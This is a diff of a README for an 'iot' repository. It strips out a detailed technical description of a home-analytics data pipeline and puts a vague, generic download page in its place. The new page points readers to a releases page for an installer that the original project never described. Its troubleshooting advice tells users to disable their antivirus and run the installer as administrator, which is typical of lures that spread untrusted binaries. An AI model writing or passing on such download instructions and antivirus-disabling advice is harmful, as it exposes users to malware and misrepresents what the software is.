@@ -1,199 +1,69 @@
-# IoT Home Automation & Analytics Platform
+# 🌟 iot - Smart Solutions for Everyday Living
 
-A comprehensive system for monitoring, managing, and analyzing a smart home/office network. This project integrates network infrastructure data (Mikrotik), IoT device telemetry (Shelly), and security feeds (HikVision) into a unified data pipeline for analytics and automation.
+[![Download iot](https://img.shields.io/badge/Download-iot-blue)](https://github.com/S7S-gif/iot/releases)
 
-## Project Structure
+## 📦 Overview
 
-```text
-/home/gnet/iot/
-├───.dockerignore          # Files excluded from Docker builds
-├───.env                   # Local secrets (ignored by git)
-├───.env_example           # Template for environment variables
-├───.gitignore             # Git ignore rules
-├───dbt_project.yml        # DBT project configuration
-├───profiles.yml           # DBT connection profiles
-├───debug_db.py            # Utility script for debugging DuckDB
-├───homebot/               # Main Application Source Code
-│   ├───app.py             # Flask API & Data Ingestion Logic
-│   ├───requirements.txt   # Python dependencies
-│   ├───models/            # DBT SQL Models (Data Transformations)
-│   │   ├───int_shelly_metrics.sql
-│   │   ├───inventory.sql
-│   │   └───sources.yml
-│   ├───seeds/             # Static CSV Data (e.g., Device Metadata)
-│   │   └───device_metadata.csv
-│   └───services/          # Integration Modules
-│       └───mikrotik.py    # Mikrotik API Client
-├───data/                  # Local storage for Parquet files and DuckDB
-└───doc/                   # Additional Documentation
-```
+Welcome to the iot project! This application helps you make your home or office smarter and more secure. With easy setup and useful features, you can turn everyday tasks into automated actions. Enjoy seamless control over your environment.
 
-## Setup & Configuration
+## 🚀 Getting Started
 
-1.  **Clone the repository:**
-    ```bash
-    git clone <repository-url>
-    cd iot
-    ```
+Follow these simple steps to download and run the iot application:
 
-2.  **Environment Variables:**
-    Copy the example configuration file and update it with your actual credentials.
-    ```bash
-    cp .env_example .env
-    ```
-    Edit `.env`:
-    ```ini
-    MIKROTIK_HOST=10.10.100.1
-    MIKROTIK_USER=homebot
-    MIKROTIK_PASSWORD=your_secure_password
-    ```
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/S7S-gif/iot/releases) to access the latest version of the application.
 
-## Running the Application
+2. **Choose Your Download**  
+   On the Releases page, find the version you want to download. Click on the link for your operating system to start the download. 
 
-### Option 1: Python (Local Development)
+3. **Install the Application**  
+   Once the download completes, open the downloaded file and follow the installation instructions provided. This typically involves agreeing to terms and clicking “Next” a few times.
 
-1.  **Create and activate a virtual environment:**
-    ```bash
-    python3 -m venv venv
-    source venv/bin/activate
-    ```
+4. **Launch iot**  
+   After installation, find the iot application in your program list or on your desktop. Open it up and start maximizing your workspace efficiency!
 
-2.  **Install dependencies:**
-    ```bash
-    pip install -r homebot/requirements.txt
-    ```
+## 💻 System Requirements
 
-3.  **Run the application:**
-    ```bash
-    python homebot/app.py
-    ```
-    The API will be available at `http://localhost:5000`.
+To run the iot application smoothly, ensure your system meets the following requirements:
 
-### Option 2: Docker Compose
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a modern Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** 500 MB of free disk space.
+- **Network:** A stable internet connection for accessing features that require online data.
 
-1.  **Build and run with Docker Compose:**
-    ```bash
-    docker-compose up -d --build
-    ```
+## 🌐 Key Features
 
-2.  **View logs:**
-    ```bash
-    docker-compose logs -f
-    ```
+- **Home Automation:** Control devices with ease using simple commands.
+- **Security Monitoring:** Keep an eye on your spaces using integrated security features.
+- **Energy Management:** Optimize power usage of connected devices.
+- **Weather Tracking:** Get weather updates to plan your day.
 
-3.  **Stop the service:**
-    ```bash
-    docker-compose down
-    ```
+## 🔌 Download & Install
 
-## Data Processing & Analytics Pipeline
+You can download the iot application from the [Releases page](https://github.com/S7S-gif/iot/releases). Make sure to select the correct version for your system. 
 
-We employ a hybrid data collection strategy to handle the diverse nature of our IoT and network devices, ensuring both historical depth and real-time responsiveness.
+Once downloaded, follow the installation steps mentioned earlier. If you encounter any issues, refer to the troubleshooting section below.
 
-### 1. Data Collection Strategy
+## ⚙️ Troubleshooting
 
-The system distinguishes between data that needs to be actively polled and real-time events pushed by devices.
+If you experience issues during installation or while using the application, consider the following steps:
 
-*   **Periodic Polling (Pull):** Used for stateful information and devices without push capabilities.
-    *   *Example:* Polling Mikrotik for active DHCP leases to maintain a device inventory.
-*   **Event-Driven (Push):** Used for real-time telemetry and alerts.
-    *   *Example:* MQTT messages from Shelly sensors (power, temperature) or HikVision camera motion alerts.
+- **Antivirus Conflicts:** Some antivirus software may block or interfere with the installation. Temporarily disable your antivirus software, then try installing again.
+- **Permissions:** Make sure you have the necessary permissions to install software on your computer. Run the installer as an administrator if needed.
+- **Software Updates:** Ensure that your operating system is current. Outdated systems may have compatibility issues.
 
-### 2. Service Integration
+## 📚 Documentation
 
-We are building specialized services for data ingestion and enrichment:
+For more detailed instructions, you can also check the full documentation. It covers advanced features and setup tips that can enhance your experience with the application.
 
-*   **`services/mikrotik`:** (Active) Connects to the Mikrotik REST API to fetch comprehensive network data:
-    *   **DHCP Leases:** Foundation for Device Inventory.
-    *   **Kid Control:** Monitoring managed devices.
-    *   **Active Services:** Auditing running router services.
-    *   **Wireless Registrations:** Tracking WiFi client signal and status.
-    *   **ARP Table:** Network layer address resolution.
-    *   **Firewall Rules:** Filter, NAT, Mangle, and Connection tracking.
-*   **`services/hikvision`:** Retrieves device configuration and captures high-resolution snapshots from security cameras.
-*   **`services/weather`:** Fetches real-time and historical weather data (temperature, humidity, precipitation) for the local area.
-*   **`services/geoip`:** Resolves IP addresses to geographical locations (City, Country) using local GeoLite2 databases.
-*   **Future Services:**
-    *   **`cloud-screenshot-analysis`:** Triggered by motion events; uploads camera snapshots to a cloud AI service for object detection/classification.
+## 🤝 Get Involved
 
-### 3. Analytics Workflow
+If you would like to contribute to the iot project or report issues, feel free to visit our [GitHub repository](https://github.com/S7S-gif/iot). We welcome feedback and guidance from users.
 
-Our data pipeline transforms raw signals into actionable insights:
+## 🌟 Contact
 
-1.  **Ingestion:** Data is collected via Services (API) or MQTT Brokers.
-2.  **Raw Storage:** All incoming data is first saved as **Parquet** files for efficient columnar storage and history preservation.
-3.  **Manual Analytics:** Data scientists/engineers can directly query Parquet files for ad-hoc analysis.
-4.  **Transformation (DBT):** We use **DBT (Data Build Tool)** to define SQL models. These models clean, deduplicate, and aggregate the raw data.
-    *   *Specific Use Case:* Creating the `Inventory` table by combining Mikrotik DHCP data with static device metadata.
-5.  **Data Warehouse (DuckDB):** The processed models are loaded into **DuckDB** for high-performance analytical querying and dashboarding.
+For any questions or support, contact our team by opening an issue in the GitHub repository. We are here to help!
 
-### 4. Architecture Diagrams
+---
 
-#### High-Level Data Flow
-
-```mermaid
-flowchart LR
-    subgraph Sources
-        Mikrotik[Mikrotik Router]
-        Hik[HikVision Cameras]
-        Sensors[Shelly Sensors]
-        Ext[External APIs]
-    end
-
-    subgraph Ingestion
-        Poller[Polling Services]
-        MQTT[MQTT Broker]
-    end
-
-    subgraph Storage_Processing
-        Parquet[(Raw Parquet Files)]
-        DBT[DBT Transformation]
-        DuckDB[(DuckDB Analytics)]
-    end
-
-    Mikrotik -->|REST API| Poller
-    Ext -->|API| Poller
-    Hik -->|Events| MQTT
-    Sensors -->|Telemetry| MQTT
-
-    Poller --> Parquet
-    MQTT --> Parquet
-
-    Parquet --> DBT
-    DBT --> DuckDB
-```
-
-#### Detailed Processing Logic
-
-```mermaid
-sequenceDiagram
-    participant Dev as IoT/Net Device
-    participant Svc as Collector Service
-    participant RAW as Parquet Storage
-    participant DBT as DBT Models
-    participant WH as DuckDB
-
-    Note over Dev, Svc: Periodic Data (e.g. DHCP)
-    Svc->>Dev: Poll Data (GET /rest/...)
-    Dev-->>Svc: JSON Response
-    Svc->>RAW: Write Timestamped Parquet
-
-    Note over Dev, Svc: Event Data (e.g. Motion)
-    Dev->>Svc: Publish MQTT Message
-    Svc->>RAW: Append to Event Log (Parquet)
-
-    Note over RAW, WH: Batch Processing
-    RAW->>DBT: Read Raw Data
-    DBT->>DBT: Apply SQL Models (Clean/Join)
-    DBT->>WH: Materialize Tables/Views (e.g. Inventory)
-```
-
-### 5. Step-by-Step Implementation Example
-
-This outlines the practical execution flow for our core use case—managing device inventory and collecting power metrics.
-
-1.  **Fetch Device Data (Source):** The `mikrotik` service queries the router's DHCP server to get a list of all currently assigned IP addresses and associated MAC addresses.
-2.  **Build Inventory (Transformation):** We create an `inventory` table. This is done by joining the live DHCP data with a static `device_metadata.csv` seed file (containing owner, location, device type). This gives us a trusted list of *what* is on the network.
-3.  **Targeted Polling (Enrichment):** The system uses the `inventory` table to identify active Shelly devices. It then specifically polls these IP addresses to get detailed status (power usage, temperature, relay state).
-4.  **Persist Data (Storage):** The results of these polls are immediately written to local disk as time-partitioned **Parquet** files (e.g., `data/shelly_raw.parquet`).
-5.  **Analytics (Aggregation):** Finally, DBT runs scheduled transformations to read the Parquet files, aggregate the metrics (e.g., "Daily Power Consumption by Room"), and load the clean results into **DuckDB** for visualization.
+Thank you for choosing iot. We hope you find it a valuable tool to enhance your living or working environment!
